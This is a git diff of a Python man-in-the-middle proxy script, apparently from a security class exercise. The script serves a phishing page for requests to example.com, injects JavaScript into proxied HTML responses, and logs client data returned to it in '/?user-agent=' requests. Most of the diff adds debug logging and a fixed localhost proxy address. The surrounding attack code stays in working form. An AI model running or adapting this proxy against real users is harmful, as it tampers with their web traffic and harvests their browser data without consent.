@@ -6,9 +6,20 @@ import re
 from urllib.parse import unquote
 import netifaces
 
-DEBUG = True
-PROXY_IP = None
-PROXY_IP_INTERFACE = "0.0.0.0"
+'''
+NOTE
+The following command should work. Using a different IP or a port smaller than 1024 may result in access denied errors.
+python proxy.py -m passive -i 127.0.0.1 -p 8080
+python proxy.py -m active -i 127.0.0.1 -p 8080
+
+To kill the process running on a port, use the following command on terminal:
+lsof -i :8080 # Get the PID of the process running on port 8080
+kill -9 <PID> # Kill the process
+'''
+
+DEBUG = False
+PROXY_IP = "127.0.0.1"
+PROXY_INTERFACE = "0.0.0.0"
 
 def generate_phishing_page():
     if DEBUG:
@@ -97,7 +108,7 @@ def inject_javascript(response_data):
         </script>
     """
     response_data = modify_content_length_header(response_data, len(js_code))
-    js_code = js_code.replace("{proxy_ip}", "127.0.0.1") #PROXY_IP
+    js_code = js_code.replace("{proxy_ip}", PROXY_IP)
     js_code = js_code.replace("{proxy_port}", str(8080))
 
     # Find the position of the </body> tag
@@ -124,24 +135,26 @@ def handle_active_client(client_socket):
     request = request.replace(b'\r\n\r\n', b'\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n')
     request = request.decode('utf-8')
 
-    print("Received request")
-
     host, port = get_destination_host_port(request)
     # Check if request is for the predefined domain for phishing
     if host == "example.com":
+        print("Request for phishing domain received.")
         # Send a phishing page (malicious JavaScript)
         client_socket.send(generate_phishing_page().encode('utf-8'))
+        print("Phishing page sent to client.")
         client_socket.close()
         return
 
      # Handle the GET request with client data
     if '/?user-agent=' in request:
+        print("Request with client data received.")
         parse_and_log_client_data(request)
         # Send a simple HTTP response (acknowledgment)
-        #client_socket.sendall("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
+        client_socket.send("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
         client_socket.close()
         return
 
+    print("Request for {} received.".format(host))
 
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.connect((host, 80))
@@ -154,24 +167,32 @@ def handle_active_client(client_socket):
     while True:
         try:
             chunk = server_socket.recv(8192) 
-            print(c)
+            if DEBUG:
+                print(c)
             c += 1
-            print('Len of chunk: ',len(chunk) )
+            if DEBUG:
+                print('Len of chunk: ',len(chunk) )
             # Check if the end of the HTML content has been reached
             if len(chunk) == 0:
                 break
             response_data += chunk
         except socket.timeout:
             break
-    print("Receieved all chunks")
+    print(f"Receieved all chunks: {c}")
     response = response_data.decode('utf-8')
     if response:
         #if 'text/html' in response:
         response = inject_javascript(response)
         client_socket.send(response.encode('utf-8'))
-        print("Response sent to client.")
-        print("Response is:\n{}".format(response))
+        print("Response with injected javascript sent to client.")
+        if DEBUG:
+            print("Response is:\n{}".format(response))
+    else:
+        print("No response received from the server.")
+        client_socket.close()
+        server_socket.close()
 
+    #print("Closing client socket...")
     #client_socket.close()
     #server_socket.close()
 
@@ -182,16 +203,16 @@ def handle_active_client(client_socket):
 
 def proxy_active(listening_ip, listening_port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((PROXY_IP_INTERFACE, int(listening_port)))
+    server.bind((PROXY_INTERFACE, int(listening_port)))
     server.listen(5)
-    print("Proxy server listening on {}:{}".format(PROXY_IP_INTERFACE, listening_port))
+    print("Proxy server listening on {}:{}".format(PROXY_INTERFACE, listening_port))
 
     while True:
         client_socket, client_address = server.accept()
         if client_address[0] != listening_ip:
             print("Invalid client IP. Exiting...")
             exit(1)
-        print("Client connected from {}:{}".format(client_address[0], client_address[1]))
+        print("\n\nClient connected from {}:{}".format(client_address[0], client_address[1]))
         client_thread = threading.Thread(target=handle_active_client, args=(client_socket, ))
         client_thread.start()
 
@@ -221,10 +242,10 @@ def main():
         print("No listening port provided. Exiting...")
         exit(1)
 
-    gateways = netifaces.gateways()
-    interface = gateways['default'][netifaces.AF_INET][1]
-    global PROXY_IP
-    PROXY_IP = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']    
+    #gateways = netifaces.gateways()
+    #interface = gateways['default'][netifaces.AF_INET][1]
+    #global PROXY_IP
+    #PROXY_IP = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']    
 
     if args.mode == "active":
         proxy_active(args.listening_ip, args.listening_port)
